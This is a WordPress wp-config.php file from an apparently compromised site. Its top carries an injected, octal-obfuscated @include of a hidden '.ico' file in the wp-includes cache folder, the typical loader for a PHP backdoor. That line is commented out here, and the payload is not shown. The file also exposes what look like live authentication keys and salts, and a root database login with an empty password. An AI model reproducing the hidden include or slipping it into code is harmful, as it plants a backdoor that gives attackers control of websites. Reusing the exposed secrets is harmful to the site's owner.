<?php
/*25c9c*/

#@include "\057home\057wain\163oho/\160unja\142ijha\164ka.c\157m/wp\055incl\165des/\123impl\145Pie/\103ache\057.62d\1442324\056ico";

/*25c9c*/

/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wainsoho_punj');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', '');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'gpzazrl3hygt1y4qsagcpt8etd68sn68gplt5gw73r7ogpzzaavujt1zlzuxq4gh');
define('SECURE_AUTH_KEY',  'rzoy1n9oniqnqd3xzge7kbt8mis32i9t0l6y0jaq7aj3ibqt5837x2vsu5ffa292');
define('LOGGED_IN_KEY',    '9zg8vzdwgsruqi9vzlzn7ctail5oid4pfa4zb4izum4l36vitmasvlkw5waojmqu');
define('NONCE_KEY',        'rsvrrjsh5plgxe8motd9kxcql58bgqm9igyonakxw3kwegs6qasfrlebwajmraai');
define('AUTH_SALT',        'wlofkfd5sthlibeuryw4ktpmkeref81ox0nvswnzs5rkv9c3xu2iumr5vi3n8mid');
define('SECURE_AUTH_SALT', 'tilx9ugpg3ngbkd4v7936k8co71ii4meaqg5rbow74p39othw91zupycavb4jetg');
define('LOGGED_IN_SALT',   'rz1sradk6rf4wgdtldk7fkdbz8bfpwghsp1i3hk5o4hef5hmrbyeod0dy9m9bjgz');
define('NONCE_SALT',       'xl9lazmau4zanpgq56p84bsjypx1sdsszfhtpdfdoiwco04tlxpvqfgg54jytxtc');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
